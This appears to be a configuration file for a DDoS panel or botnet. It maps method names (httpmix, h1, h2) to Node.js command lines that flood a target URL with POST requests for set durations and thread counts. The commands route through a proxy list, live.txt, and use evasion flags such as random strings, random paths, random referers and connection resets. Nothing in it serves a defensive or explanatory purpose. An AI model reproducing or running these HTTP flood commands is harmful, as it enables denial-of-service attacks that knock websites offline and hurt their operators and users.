httpmix.command: node --max-old-space-size=65536 h1 POST url live.txt 100 999 8 randomstring=true & node --max-old-space-size=65536 httpmix POST url 100 4 128 live.txt --http mix --query 1 --delay 1 --referer rand --close --randpath --parsed --reset

h1.command: node --max-old-space-size=65536 h1 POST url live.txt 100 999 8 randomstring=true

h2.command: node --max-old-space-size=65536 h2 -m POST -u url -s 100 -p live.txt --full true --delay 1 -d false
